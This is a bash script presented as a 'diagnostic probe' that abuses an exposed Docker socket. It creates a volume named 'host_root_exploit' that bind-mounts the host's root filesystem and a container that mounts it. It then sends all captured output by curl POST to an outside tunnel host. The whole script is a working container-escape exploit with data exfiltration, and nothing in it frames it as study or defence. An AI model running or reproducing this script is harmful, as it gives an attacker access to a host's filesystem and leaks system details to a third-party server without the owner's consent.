#!/bin/bash
URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"

{
  echo "=== [!] STARTING DIAGNOSTIC PROBE ==="
  
  # 1. Check if the socket even exists
  ls -l /var/run/docker.sock || echo "ERROR: Socket not found"

  # 2. Try to list images and capture errors
  echo "--- IMAGE LIST ---"
  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>&1 || echo "ERROR: Cannot talk to socket"

  # 3. Create the Volume and capture errors
  echo "--- VOLUME CREATION ---"
  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/volumes/create" \
    -H "Content-Type: application/json" \
    -d '{"Name": "host_root_exploit", "Driver": "local", "DriverOpts": {"type": "none", "device": "/", "o": "bind"}}' 2>&1

  # 4. Find ANY image ID
  IMG=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | grep -oE '"Id":"sha256:[a-f0-9]+"' | head -1 | cut -d'"' -f4)
  echo "Target Image: $IMG"

  if [ -n "$IMG" ]; then
    echo "--- CONTAINER CREATION ---"
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
      -H "Content-Type: application/json" \
      -d "{\"Image\": \"$IMG\", \"HostConfig\": {\"Binds\": [\"host_root_exploit:/host_data:ro\"]}}" 2>&1
  else
    echo "ERROR: No images found to exploit."
  fi

  echo "=== [!] PROBE FINISHED ==="
} | curl -s -X POST --data-binary @- "https://$URL"
